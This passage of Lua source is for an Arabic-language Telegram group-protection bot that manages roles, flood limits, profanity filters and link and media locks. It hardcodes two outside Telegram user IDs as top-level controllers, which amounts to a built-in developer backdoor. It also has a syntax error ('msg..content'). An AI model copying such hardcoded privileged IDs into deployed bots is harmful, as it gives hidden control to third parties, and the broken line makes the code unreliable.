if GetMemberStatus.can_promote_members then
promote = true else promote = false
end
return{SetAdmin = promote,BanUser = restrict_members,Invite = invite_users,PinMsg = pin_messages,DelMsg = delete_messages,Info = change_info}
end
function download(url,name)
if not name then
name = url:match('([^/]+)$')
end
if string.find(url,'https') then
data,res = https.request(url)
elseif string.find(url,'http') then
data,res = http.request(url)
else
return 'The link format is incorrect.'
end
if res ~= 200 then
return 'check url , error code : '..res
else
file = io.open(name,'wb')
file:write(data)
file:close()
print('Downloaded :> '..name)
return './'..name
end
end
function ChannelJoin(msg)
JoinChannel = true
local chh = Redis:get(LaRiCa.."chfalse")
if chh then
local url = https.request("https://api.telegram.org/bot"..Token.."/getchatmember?chat_id="..chh.."&user_id="..msg.sender.user_id)
data = json:decode(url)
if data.result.status == "left" or data.result.status == "kicked" then
JoinChannel = false 
end
end
return JoinChannel
end
function editrtp(chat,user,msgid,useri)
if Redis:sismember(LaRiCa.."BanGroup:Group"..chat,useri) then
BanGroupz = "✓"
else
BanGroupz = "✗"
end
if Redis:sismember(LaRiCa.."SilentGroup:Group"..chat,useri) then
SilentGroupz = "✓"
else
SilentGroupz = "✗"
end
if Redis:sismember(LaRiCa.."Supcreator:Group"..chat,useri)  then
TheBasicsz = "✓"
else
TheBasicsz = "✗"
end
if Redis:sismember(LaRiCa.."Creator:Group"..chat,useri) then
Originatorsz = "✓"
else
Originatorsz = "✗"
end
if Redis:sismember(LaRiCa.."Manger:Group"..chat,useri) then
Managersz = "✓"
else
Managersz = "✗"
end
if Redis:sismember(LaRiCa.."Admin:Group"..chat,useri) then
Addictivez = "✓"
else
Addictivez = "✗"
end
if Redis:sismember(LaRiCa.."Special:Group"..chat,useri) then
Distinguishedz = "✓"
else
Distinguishedz = "✗"
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = 'رفع منشئ اساسي : '..TheBasicsz, data =user..'/statusTheBasicsz/'..useri},{text = 'رفع منشئ : '..Originatorsz, data =user..'/statusOriginatorsz/'..useri},},
{{text = 'رفع مدير : '..Managersz, data =user..'/statusManagersz/'..useri},{text = 'رفع ادمن : '..Addictivez, data =user..'/statusAddictivez/'..useri},},
{{text = 'رفع مميز : '..Distinguishedz, data =user..'/statusDistinguishedz/'..useri},},
{{text = 'حظر العضو : '..BanGroupz, data =user..'/statusban/'..useri},{text = 'كتم العضو : '..SilentGroupz, data =user..'/statusktm/'..useri},},
{{text = 'مسح الرتب : ', data =user..'/statusmem/'..useri},},
{{text = '٬ 𝗁𝗂𝖽𝖾 𝗂𝗍 ٫ ', data ='/delAmr1'}}}}
return LuaTele.editMessageText(chat,msgid,'*\n• يمكنك تحكم بالعضو عن طريق الازرار . .*', 'md', true, false, reply_markup)
end
function File_Bot_Run(msg,data)  
local msg_chat_id = msg.chat_id
local msg_reply_id = msg.reply_to_message_id
local msg_user_send_id = msg.sender.user_id
local msg_id = msg.id
--var(msg.content)
if data.sender.luatele == "messageSenderChat" and Redis:get(LaRiCa.."Lock:channell"..msg_chat_id) then
print(Redis:get(LaRiCa.."chadmin"..msg_chat_id))
print(data.sender.chat_id)
local m = Redis:get(LaRiCa.."chadmin"..msg_chat_id) 
if data.sender.chat_id == tonumber(m) then
return false
else
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end
Redis:incr(LaRiCa..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) 
if msg.date and msg.date < tonumber(os.time() - 15) then
print("->> Old Message End <<-")
return false
end
if data.content.text then
text = data.content.text.text
else 
text = nil
end
if tonumber(msg.sender.user_id) == tonumber(LaRiCa) then
print('This is reply for Bot')
return false
end
if Statusrestricted(msg.chat_id,msg.sender.user_id).BanAll == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
elseif Statusrestricted(msg.chat_id,msg.sender.user_id).ktmall == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Statusrestricted(msg.chat_id,msg.sender.user_id).BanGroup == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
if tonumber(msg.sender.user_id) == 1573309498 then
msg.Name_Controller = 'Developer MaLaTH'
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 1573309498 then
msg.Name_Controller = 'مطور السورس '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 539371484 then
msg.Name_Controller = 'مطور السورس '
msg.The_Controller = 1
elseif The_ControllerAll(msg.sender.user_id) == true then  
msg.The_Controller = 1
msg.Name_Controller = 'المطور الاساسي '
elseif Redis:sismember(LaRiCa.."Devss:Groups",msg.sender.user_id) == true then
msg.The_Controller = 2
msg.Name_Controller = 'المطور الثانوي'
elseif Redis:sismember(LaRiCa.."Dev:Groups",msg.sender.user_id) == true then
msg.The_Controller = 3
msg.Name_Controller = Redis:get(LaRiCa.."Developer:Bot:Reply"..msg.chat_id) or 'المطور '
elseif Redis:sismember(LaRiCa.."Owners:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 44
msg.Name_Controller = Redis:get(LaRiCa.."PresidentQ:Group:Reply"..msg.chat_id) or 'المالك'
elseif Redis:sismember(LaRiCa.."Supcreator:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 4
msg.Name_Controller = Redis:get(LaRiCa.."President:Group:Reply"..msg.chat_id) or 'المنشئ الاساسي'
elseif Redis:sismember(LaRiCa.."Creator:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 5
msg.Name_Controller = Redis:get(LaRiCa.."Constructor:Group:Reply"..msg.chat_id) or 'المنشئ '
elseif Redis:sismember(LaRiCa.."Manger:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 6
msg.Name_Controller = Redis:get(LaRiCa.."Manager:Group:Reply"..msg.chat_id) or 'المدير '
elseif Redis:sismember(LaRiCa.."Admin:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 7
msg.Name_Controller = Redis:get(LaRiCa.."Admin:Group:Reply"..msg.chat_id) or 'الادمن '
elseif Redis:sismember(LaRiCa.."Special:Group"..msg.chat_id,msg.sender.user_id) == true then
msg.The_Controller = 8
msg.Name_Controller = Redis:get(LaRiCa.."Vip:Group:Reply"..msg.chat_id) or 'المميز '
elseif tonumber(msg.sender.user_id) == tonumber(LaRiCa) then
msg.The_Controller = 9
else
msg.The_Controller = 10
msg.Name_Controller = Redis:get(LaRiCa.."Mempar:Group:Reply"..msg.chat_id) or 'العضو '
end  
if msg.The_Controller == 1 then  
msg.ControllerBot = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 then
msg.Devss = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 then
msg.Dev = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 9 then
msg.Supcreatorm = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 9 then
msg.Supcreator = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 9 then
msg.Creator = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 6 or msg.The_Controller == 9 then
msg.Manger = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 6 or msg.The_Controller == 7 or msg.The_Controller == 9 then
msg.Admin = true
end
if msg.The_Controller == 1 or msg.The_Controller == 2 or msg.The_Controller == 3 or msg.The_Controller == 44 or msg.The_Controller == 4 or msg.The_Controller == 5 or msg.The_Controller == 6 or msg.The_Controller == 7 or msg.The_Controller == 8 or msg.The_Controller == 9 then
msg.Special = true
end
if Redis:get(LaRiCa.."Lock:text"..msg_chat_id) and not msg.Special then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return false
end 
if msg.content.luatele == "messageChatJoinByLink" then
if Redis:get(LaRiCa.."Status:Welcome"..msg_chat_id) then
local UserInfo = LuaTele.getUser(msg.sender.user_id)
local Get_Chat = LuaTele.getChat(msg_chat_id)
local Welcome = Redis:get(LaRiCa.."Welcome:Group"..msg_chat_id)
if Welcome then 
if UserInfo.username then
UserInfousername = '@'..UserInfo.username
else
UserInfousername = 'لا يوجد '
end
Welcome = Welcome:gsub('{name}',UserInfo.first_name) 
Welcome = Welcome:gsub('{user}',UserInfousername) 
Welcome = Welcome:gsub('{NameCh}',Get_Chat.title) 
return LuaTele.sendText(msg_chat_id,msg_id,Welcome,"md")  
else
return LuaTele.sendText(msg_chat_id,msg_id,'• اطلق دفرخ ['..UserInfo.first_name..'](tg://user?id='..msg.sender.user_id..')\n• نورت الكروب {'..Get_Chat.title..'}',"md")  
end
end
end
if not msg.Special and msg.content.luatele ~= "messageChatAddMembers" and Redis:hget(LaRiCa.."Spam:Group:User"..msg_chat_id,"Spam:User") then 
if tonumber(msg.sender.user_id) == tonumber(LaRiCa) then
return false
end
local floods = Redis:hget(LaRiCa.."Spam:Group:User"..msg_chat_id,"Spam:User") or "nil"
local Num_Msg_Max = Redis:hget(LaRiCa.."Spam:Group:User"..msg_chat_id,"Num:Spam") or 5
local post_count = tonumber(Redis:get(LaRiCa.."Spam:Cont"..msg.sender.user_id..":"..msg_chat_id) or 0)
if post_count >= tonumber(Redis:hget(LaRiCa.."Spam:Group:User"..msg_chat_id,"Num:Spam") or 5) then 
local type = Redis:hget(LaRiCa.."Spam:Group:User"..msg_chat_id,"Spam:User") 
if type == "kick" then 
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0), LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• قام بالتكرار في الكروب وتم طرده").Reply,"md",true)
end
if type == "del" then 
return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
if type == "keed" then
return LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0}), LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• قام بالتكرار في الكروب وتم تقييده").Reply,"md",true)  
end
if type == "mute" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"• قام بالتكرار في الكروب وتم كتمه").Reply,"md",true)  
end
end
Redis:setex(LaRiCa.."Spam:Cont"..msg.sender.user_id..":"..msg_chat_id, tonumber(5), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if Redis:hget(LaRiCa.."Spam:Group:User"..msg_chat_id,"Num:Spam") then
Num_Msg_Max = Redis:hget(LaRiCa.."Spam:Group:User"..msg_chat_id,"Num:Spam") 
end
end 
if text and Redis:get(LaRiCa..'lock:Fshar'..msg.chat_id) and not msg.Special then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return false
end
end
end
if text and Redis:get(LaRiCa..'lock:Fars'..msg.chat_id) and not msg.Special then 
list = {"که","پی","خسته","برم","راحتی","بیام","بپوشم","كرمه","چه","ڬ","ڿ","ڀ","ڎ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن"}
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
return false
end
end
end
if text and not msg.Special then
local _nl, ctrl_ = string.gsub(text, "%c", "")  
local _nl, real_ = string.gsub(text, "%d", "")   
sens = 400  
if Redis:get(LaRiCa.."Lock:Spam"..msg.chat_id) == "del" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Redis:get(LaRiCa.."Lock:Spam"..msg.chat_id) == "ked" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Redis:get(LaRiCa.."Lock:Spam"..msg.chat_id) == "kick" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Redis:get(LaRiCa.."Lock:Spam"..msg.chat_id) == "ktm" and string.len(text) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
end
if msg.forward_info and not msg.Admin then -- التوجيه
local Fwd_Group = Redis:get(LaRiCa.."Lock:forward"..msg_chat_id)
if Fwd_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Fwd_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Fwd_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Fwd_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is forward')
return false
end 
if msg.reply_markup and msg.reply_markup.luatele == "replyMarkupInlineKeyboard" then
if not msg.Special then  -- الكيبورد
local Keyboard_Group = Redis:get(LaRiCa.."Lock:Keyboard"..msg_chat_id)
if Keyboard_Group == "del" then
var(LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}))
elseif Keyboard_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Keyboard_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Keyboard_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
end
print('This is reply_markup')
end 
if msg.content.location and not msg.Special then  -- الموقع
if location then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
end
print('This is location')
end 
if msg.content.entities and msg..content.entities[0] and msg.content.entities[0].type.luatele == "textEntityTypeUrl" and not msg.Special then  -- الماركداون
local Markduan_Gtoup = Redis:get(LaRiCa.."Lock:Markdaun"..msg_chat_id)
if Markduan_Gtoup == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Markduan_Gtoup == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Markduan_Gtoup == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Markduan_Gtoup == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is textEntityTypeUrl')
end 
if msg.content.game and not msg.Special then  -- الالعاب
local Games_Group = Redis:get(LaRiCa.."Lock:geam"..msg_chat_id)
if Games_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Games_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Games_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Games_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is games')
end 
if msg.content.luatele == "messagePinMessage" then -- رساله التثبيت
local Pin_Msg = Redis:get(LaRiCa.."lockpin"..msg_chat_id)
if Pin_Msg and not msg.Manger then
if Pin_Msg:match("(%d+)") then 
local PinMsg = LuaTele.pinChatMessage(msg_chat_id,Pin_Msg,true)
if PinMsg.luatele~= "ok" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لا استطيع تثبيت الرسائل ليست لديه صلاحيه","md",true)
end
end
local UnPin = LuaTele.unpinChatMessage(msg_chat_id) 
if UnPin.luatele ~= "ok" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• لا استطيع الغاء تثبيت الرسائل ليست لديه صلاحيه","md",true)
end
return LuaTele.sendText(msg_chat_id,msg_id,"\n• التثبيت معطل من قبل المدراء ","md",true)
end
print('This is message Pin')
end 
if msg.content.luatele == "messageChatAddMembers" then -- اضافه اشخاص
print('This is Add Membeers ')
Redis:incr(LaRiCa.."Num:Add:Memp"..msg_chat_id..":"..msg.sender.user_id) 
local AddMembrs = Redis:get(LaRiCa.."Lock:AddMempar"..msg_chat_id) 
local Lock_Bots = Redis:get(LaRiCa.."Lock:Bot:kick"..msg_chat_id)
for k,v in pairs(msg.content.member_user_ids) do
local Info_User = LuaTele.getUser(v) 
print(v)
if v == tonumber(LaRiCa) then
local N = (Redis:get(LaRiCa.."Name:Bot") or "لاريكا")
photo = LuaTele.getUserProfilePhotos(LaRiCa)
local TextBot = '*• انا بوت اسمي '..N..'\n• وظيفتي حمايه المجموعة من السبام والتفليش الخ..\n• لتفعيل البوت البوت اكتب تفعيل او استعمل الازرار بالاسفل\n*'
--[[
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• غادر •', data = msg.sender.user_id..'/leftgroup@'..msg_chat_id},{text = '• تفعيل •', data = msg.sender.user_id..'/addAdmins@'..msg_chat_id},},
{{text = '• 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. •', url = 't.me/LaRiCaTeam'}, },}}
--]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• غادر •', callback_data=msg.sender.user_id..'/leftgroup@'..msg_chat_id},{text = '• تفعيل •', callback_data = msg.sender.user_id..'/onlinebott'..msg_chat_id},},
{{text = '• 𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈. •', url = 't.me/LaRiCaTeam'},}}
local rep = msg.id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id="..msg.chat_id.."&reply_to_message_id="..rep.."&photo="..photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id.."&caption="..URL.escape(TextBot).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
--return LuaTele.sendPhoto(msg.chat_id, 0, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id, TextBot, "md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup)
end
Redis:set(LaRiCa.."Who:Added:Me"..msg_chat_id..":"..v,msg.sender.user_id)
if Info_User.type.luatele == "userTypeBot" then
if Lock_Bots == "del" and not msg.ControllerBot then
LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
elseif Lock_Bots == "kick" and not msg.ControllerBot then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
end
elseif Info_User.type.luatele == "userTypeRegular" then
Redis:incr(LaRiCa.."Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) 
if AddMembrs == "kick" and not msg.ControllerBot then
LuaTele.setChatMemberStatus(msg.chat_id,v,'banned',0)
end
end
end
end 
if msg.content.luatele == "messageContact" and not msg.Special then  -- الجهات
local Contact_Group = Redis:get(LaRiCa.."Lock:Contact"..msg_chat_id)
if Contact_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Contact_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Contact_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Contact_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Contact')
end 
if msg.content.luatele == "messageVideoNote" and not msg.Special then  -- بصمه الفيديو
local Videonote_Group = Redis:get(LaRiCa.."Lock:Unsupported"..msg_chat_id)
if Videonote_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Videonote_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Videonote_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Videonote_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is video Note')
end 
if msg.content.luatele == "messageDocument" and not msg.Special then  -- الملفات
local Document_Group = Redis:get(LaRiCa.."Lock:Document"..msg_chat_id)
if Document_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Document_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Document_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Document_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Document')
end 
if msg.content.luatele == "messageAudio" and not msg.Special then  -- الملفات الصوتيه
local Audio_Group = Redis:get(LaRiCa.."Lock:Audio"..msg_chat_id)
if Audio_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Audio_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Audio_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Audio_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Audio')
end 
if msg.content.luatele == "messageVideo" and not msg.Special then  -- الفيديو
local Video_Grouo = Redis:get(LaRiCa.."Lock:Video"..msg_chat_id)
if Video_Grouo == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Video_Grouo == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Video_Grouo == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Video_Grouo == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Video')
end 
if msg.content.luatele == "messageVoiceNote" and not msg.Special then  -- البصمات
local Voice_Group = Redis:get(LaRiCa.."Lock:vico"..msg_chat_id)
if Voice_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Voice_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Voice_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Voice_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Voice')
end 
if msg.content.luatele == "messageSticker" and not msg.Special then  -- الملصقات
local Sticker_Group = Redis:get(LaRiCa.."Lock:Sticker"..msg_chat_id)
if Sticker_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Sticker_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Sticker_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Sticker_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Sticker')
end 
if msg.via_bot_user_id ~= 0 and not msg.Special then  -- انلاين
local Inlen_Group = Redis:get(LaRiCa.."Lock:Inlen"..msg_chat_id)
if Inlen_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Inlen_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Inlen_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Inlen_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is viabot')
end
if msg.content.luatele == "messageAnimation" and not msg.Special then  -- المتحركات
local Gif_group = Redis:get(LaRiCa.."Lock:Animation"..msg_chat_id)
if Gif_group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Gif_group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Gif_group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Gif_group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Animation')
end 
if msg.content.luatele == "messagePhoto" and not msg.Special then  -- الصور
local Photo_Group = Redis:get(LaRiCa.."Lock:Photo"..msg_chat_id)
if Photo_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
elseif Photo_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
elseif Photo_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
elseif Photo_Group == "kick" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
print('This is Photo delete')
end
if msg.content.photo and Redis:get(LaRiCa.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id) then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
local ChatPhoto = LuaTele.setChatPhoto(msg_chat_id,idPhoto)
if (ChatPhoto.luatele == "error") then
Redis:del(LaRiCa.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• لا امتلك صلاحية تغيير معلومات الكروب ","md",true)
end
Redis:del(LaRiCa.."Chat:Photo"..msg_chat_id..":"..msg.sender.user_id)
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تغيير صوره الكروب الى ","md",true)
end
if (text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") 
or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") 
or text and text:match("[Tt].[Mm][Ee]/") 
or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") 
or text and text:match(".[Pp][Ee]") 
or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") 
or text and text:match("[Hh][Tt][Tt][Pp]://") 
or text and text:match("[Ww][Ww][Ww].") 
or text and text:match(".[Cc][Oo][Mm]")) or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match(".[Tt][Kk]") or text and text:match(".[Mm][Ll]") or text and text:match(".[Oo][Rr][Gg]") then 
local link_Group = Redis:get(LaRiCa.."Lock:Link"..msg_chat_id)  
if not msg.Special then
local u = LuaTele.getUser(msg.sender.user_id)
local txx = " • عذرآ عزيزي ↤𓆩["..u.first_name.."](tg://user?id="..u.id..")𓆪\n• *ممنوع ارسال الروابط هنا*"
if link_Group == "del" then
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
LuaTele.sendText(msg.chat_id,0,txx,"md",true)
elseif link_Group == "ked" then
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
LuaTele.sendText(msg.chat_id,0,txx,"md",true)
elseif link_Group == "ktm" then
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg.chat_id,msg.sender.user_id) 
LuaTele.sendText(msg.chat_id,0,txx,"md",true)
elseif link_Group == "kick" then
LuaTele.sendText(msg.chat_id,0,txx,"md",true)
LuaTele.setChatMemberStatus(msg.chat_id,msg.sender.user_id,'banned',0)
end
return false
end end
if text and text:match("@[%a%d_]+") and not msg.Special then 
local UserName_Group = Redis:get(LaRiCa.."Lock:User:Name"..msg_chat_id)
